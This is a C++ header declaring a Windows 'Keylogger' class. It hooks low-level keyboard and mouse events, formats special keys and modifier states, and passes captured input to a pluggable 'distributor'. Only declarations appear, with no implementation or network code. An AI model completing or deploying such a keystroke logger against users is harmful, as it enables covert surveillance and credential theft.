#pragma once

#include <string>
#include <map>
#include <functional>
#include <memory>

#include "StaticTools.h"
#include "KeyState.h"
#include "IDistributor.h"

#include "AInputType.h"
#include "InputKeyboard.h"
#include "InputMouse.h"
#include "MouseEvent.h"

#include <Windows.h>
#include <cctype>

class Keylogger
{
public:
	Keylogger(void);
	~Keylogger(void);

	void init(void);
	void keyPressed(LPKBDLLHOOKSTRUCT key);
	void keyReleased(LPKBDLLHOOKSTRUCT key);
	void mouseClick(MouseEvent me,LPMSLLHOOKSTRUCT mouse);

	void setDistributor(std::shared_ptr<IDistributor> distributor);

private:
	std::string key_Enter(KeyState v);
	std::string key_Backspace(KeyState v);
	std::string key_Delete(KeyState v);
	std::string key_Shift(KeyState v);
	std::string key_LShift(KeyState v);
	std::string key_RShift(KeyState v);
	std::string key_LAlt(KeyState v);
	std::string key_RAlt(KeyState v);
	std::string key_Alt(KeyState v);
	std::string key_LCtrl(KeyState v);
	std::string key_RCtrl(KeyState v);
	std::string key_Ctrl(KeyState v);
	std::string key_Maj(KeyState v);
	std::string key_Left(KeyState v);
	std::string key_Right(KeyState v);
	std::string key_Up(KeyState v);
	std::string key_Down(KeyState v);

	bool is_maj();
	bool is_ctrl();
	bool is_alt();
	bool is_shift();

	KeyState _maj;
	KeyState _shift;
	KeyState _lshift;
	KeyState _rshift;
	KeyState _rctrl;
	KeyState _ctrl;
	KeyState _ralt;
	KeyState _lctrl;
	KeyState _lalt;
	KeyState _alt;

	std::shared_ptr<IDistributor> _distributor;
};

